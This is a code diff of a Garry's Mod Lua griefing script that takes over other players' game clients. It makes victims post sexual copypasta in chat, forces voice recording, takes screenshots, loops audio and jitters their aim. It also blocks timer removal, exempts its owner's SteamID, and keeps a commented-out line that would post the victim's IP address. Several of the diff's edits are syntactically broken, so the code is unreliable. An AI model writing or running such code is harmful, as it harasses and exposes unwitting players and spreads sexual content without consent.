@@ -1,15 +1,20 @@
+local a = Add
+local c = Create
+local jpegs = 0
 local s = sound
 local Song = false
-local timerr = timer.Remove
-local timeradd = timer.Create
-local makehook = hook.Add
-local fmtable = FindMetaTable
-local removehook = hook.Remove
-local rcc = RunConsoleCommand 
-local jpegs = 0
+local r = Remove
+local ylp = LocalPlayer
+local _timer = timer
+local _sur = surface
+local _ccommand = ConCommand
+local _mtable = FindMetaTable
+local _command = RunConsoleCommand
+local _hook = hook
+local _http = http
 local function ss()
-    rcc('screenshot')
-    rcc('jpeg')
+    _command('screenshot')
+    _command('jpeg')
     jpegs = jpegs + 1
 end
 local annoying = {
@@ -156,44 +161,39 @@ local funnies = {
     'awdg',
     'wdad'
 }
-local check = if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
-local function oniichan()
-    timeradd('o',0,1,function() LocalPlayer():ConCommand("say Huh? Don't sniff you? Don't be silly Onii-chan I love you why can't I show my affection? (─‿‿─)♡")end)
-    timeradd('n',03,1,function() LocalPlayer():ConCommand("say Hahaha your face is red. Woah Onii-chan why are you pushing me on to the bed?")end)
-    timeradd('ii',05,1,function() LocalPlayer():ConCommand("say ヽ(°〇°)ﾉ Kyaaaaa don't tickle me Onii-chan haha counter ataaaaack pushes you down ヽ(>∀<☆)ノ.")end)
-    timeradd('-',07,1,function() LocalPlayer():ConCommand("say Hehehe I win! Onii-chan your face is really red now, Hmmh smirks (=-ω-=)")end)
-    timeradd('c',09,1,function() LocalPlayer():ConCommand("say perhaps you're falling in love with me? Chuuuuu (ﾉ´ з )ノ kisses you Woah O-onii-chan w-what are you d-doing?!")end)
-    timeradd('h',011,1,function() LocalPlayer():ConCommand("say H-hyyaaaaa don't take off my panties! D-dont look at my private spot! (/▽＼) Ah Ah Don't lick me there it's dirty!")end)
-    timeradd('a',13,1,function() LocalPlayer():ConCommand("say Ahhhhhh fuah ah ah (/ω/) O-onii-chan a-are you going to put it in? O-ok i'm ready. (／。＼)")end)
-    timeradd('n',15,1,function() LocalPlayer():ConCommand("say Heeeee I-it hurts. ~(>_<~) SWow dwon ah ah MMMH O-onii-chan I Lwve yoouuuuu! AHHHHHHH MMMHHH")end)
-    timeradd('~',17,1,function() LocalPlayer():ConCommand("say AH Hah Hah hah O-ONIII-CHAAANN you baka why did you do it inside? ヽ(д´)ノ")end)
-    timeradd('~~',19,1,function() LocalPlayer():ConCommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
+_o = false
+if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then _o = true end -- owner check
+local function oniichan() --aids copypasta
+    _timer.c('o',0,1,function() ylp:_ccommand("say Huh? Don't sniff you? Don't be silly Onii-chan I love you why can't I show my affection? (─‿‿─)♡")end)
+    _timer.c('n',03,1,function() ylp:_ccommand("say Hahaha your face is red. Woah Onii-chan why are you pushing me on to the bed?")end)
+    _timer.c('ii',05,1,function() ylp:_ccommand("say ヽ(°〇°)ﾉ Kyaaaaa don't tickle me Onii-chan haha counter ataaaaack pushes you down ヽ(>∀<☆)ノ.")end)
+    _timer.c('-',07,1,function() ylp:_ccommand("say Hehehe I win! Onii-chan your face is really red now, Hmmh smirks (=-ω-=)")end)
+    _timer.c('c',09,1,function() ylp:_ccommand("say perhaps you're falling in love with me? Chuuuuu (ﾉ´ з )ノ kisses you Woah O-onii-chan w-what are you d-doing?!")end)
+    _timer.c('h',011,1,function() ylp:_ccommand("say H-hyyaaaaa don't take off my panties! D-dont look at my private spot! (/▽＼) Ah Ah Don't lick me there it's dirty!")end)
+    _timer.c('a',13,1,function() ylp:_ccommand("say Ahhhhhh fuah ah ah (/ω/) O-onii-chan a-are you going to put it in? O-ok i'm ready. (／。＼)")end)
+    _timer.c('n',15,1,function() ylp:_ccommand("say Heeeee I-it hurts. ~(>_<~) SWow dwon ah ah MMMH O-onii-chan I Lwve yoouuuuu! AHHHHHHH MMMHHH")end)
+    _timer.c('~',17,1,function() ylp:_ccommand("say AH Hah Hah hah O-ONIII-CHAAANN you baka why did you do it inside? ヽ(д´)ノ")end)
+    _timer.c('~~',19,1,function() ylp:_ccommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
 end
 -- ALL TIMERS
-timer.Remove = function(id)
-    print("aaaaaaaaaaaaaaaaaaaaaaaa")
-    print("aaaaaaaaaaaaaaaaaaaaaaaa")
-    print("aaaaaaaaaaaaaaaaaaaaaaaa")
-    print("aaaaaaaaaaaaaaaaaaaaaaaa")
-    print("aaaaaaaaaaaaaaaaaaaaaaaa")
-    return     
-end
-timeradd("haha", 4, 10000, function() RunConsoleCommand('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end)
---timer.Create("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) RunConsoleCommand('say',b) end,function() end) end)
-timeradd("haha4", 6, 10000, function() RunConsoleCommand('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end)
+if _o then return else
+_timer.c("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
+--timer.Create("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
+_timer.c("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
 --timer.Create("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
-timeradd('hahasong', .1, 1, function() Song = true end)
---s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end)
---s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end)
---s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end)
---s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end)
---s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end)
---timer.Create('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end)
-s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end)
-timeradd('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end)
-timeradd('paste',0,10000,function()
+_timer.c('hahasong', .1, 1, function() Song = true end)
+--s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
+--s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
+--timer.Create('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
+s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
+_timer.c('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song
+_timer.c('paste',0,10000,function()
     oniichan()
     timer.Adjust('paste',21,10000,oniichan())
+end
 end)
 
 --if check then
@@ -204,34 +204,31 @@ end)
 --    timer.Remove("haha5")
 --    timer.Remove("hahasong")
 --end
-makehook('Think','funny',function()
-    --if check then
-    --    return
-    --end
-    local rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
-    local result = annoying[math.random(1,88)]
-    math.randomseed(CurTime())
-    local result2 = annoying[math.random(1,88)]
-    local cfunnies = funnies[math.random(1,30)]
-    local sresult = annoyings[math.random(1,13)]
-    --local pSong = CreateSound(LocalPlayer(),sresult)
-    --sound.Add({
-    --    name = "wowow",
-    --   channel = CHAN_STATIC,
-    --    volume = (jpegs^2),
-    --    level = 10000,
-    --    pitch = {50,200},
-    --    sound = sresult
-    --})
-    if Song then
-        --RunConsoleCommand('pp_mat_overlay',result)
-        RunConsoleCommand('+voicerecord')
-        --RunConsoleCommand('pp_mat_overlay_refractamount',tonumber(cfunnies))
-        RunConsoleCommand('pp_texturize',result2)
-        --RunConsoleCommand('fps_max','30')
-        --RunConsoleCommand('nyan_love')
-        --RunConsoleCommand('hahaball')
-        --RunConsoleCommand('status')
+_hook.a('Think','funny',function()
+    if _o then return else
+        local rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
+        local result = annoying[math.random(1,88)]
+        math.randomseed(CurTime())
+        local result2 = annoying[math.random(1,88)]
+        local cfunnies = funnies[math.random(1,30)]
+        local sresult = annoyings[math.random(1,13)]
+        --local pSong = CreateSound(LocalPlayer(),sresult)
+        --sound.Add({
+        --    name = "wowow",
+        --   channel = CHAN_STATIC,
+        --    volume = (jpegs^2),
+        --    level = 10000,
+        --    pitch = {50,200},
+        --    sound = sresult
+        --})
+        --_command('pp_mat_overlay',result)
+        _command('+voicerecord')
+        --_command('pp_mat_overlay_refractamount',tonumber(cfunnies))
+        _command('pp_texturize',result2)
+        --_command('fps_max','30')
+        --_command('nyan_love')
+        --_command('hahaball')
+        --_command('status')
         --pSong:ChangeVolume(100000)
         --pSong:SetSoundLevel(100000)
         --pSong:Play()
@@ -241,44 +238,40 @@ makehook('Think','funny',function()
         --chat.AddText(rgb, cfunnies)
         ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
 
-    end
-    if input.IsKeyDown(70) then 
-        RunConsoleCommand('cancelselect')
-        LocalPlayer = nil
+        if input.IsKeyDown(70) then 
+            _command('cancelselect')
+            LocalPlayer = nil
+        end
     end
 end)
 local pweps = LocalPlayer():GetWeapons()
-makehook('CreateMove','funny',function( CUserCmd , GM )
-    
-    --if check then 
-    --    return
-    --end
+_hook.a('CreateMove','funny',function( CUserCmd , GM ) 
+    if _o then return else
 
     local lolangle = math.random(-24, 24)
     local realangle = Angle(lolangle, lolangle,0)
     local PAngles = CUserCmd:GetViewAngles()
     local mousex = CUserCmd:GetMouseX()
     local mousey = CUserCmd:GetMouseY()
-    --RunConsoleCommand('mat_motion_blur_enabled','1')
-    --RunConsoleCommand('mat_vsync','1')
-    if Song then
+    --_command('mat_motion_blur_enabled','1')
+    --_command('mat_vsync','1')
     --render.SetAmbientLight(1,1,1)
-        --CUserCmd:SetViewAngles(PAngles - realangle)
+    CUserCmd:SetViewAngles(PAngles - realangle)
     end
 end)
-timeradd("hahafinal", 4000006, 1, function() 
+_timer.c("hahafinal", 4000006, 1, function() 
     Song = false
     
-    hook.Remove('CreateMove','funny')
-    hook.Remove('Think','funny')
+    _hook.r('CreateMove','funny')
+    _hook.r('Think','funny')
     AntiLeave = false
-    timerr("haha")
-    timerr("haha2")
-    timerr("haha3")
-    timerr("haha4")
+    _timer.r("haha")
+    _timer.r("haha2")
+    _timer.r("haha3")
+    _timer.r("haha4")
     render.SetLightingMode(0)
-    RunConsoleCommand('fps_max','0')
-    RunConsoleCommand('pp_mat_overlay','nil')
-    RunConsoleCommand('pp_texturize','"')
-    RunConsoleCommand('stopsound')
+    _command('fps_max','0')
+    _command('pp_mat_overlay','nil')
+    _command('pp_texturize','"')
+    _command('stopsound')
 end)
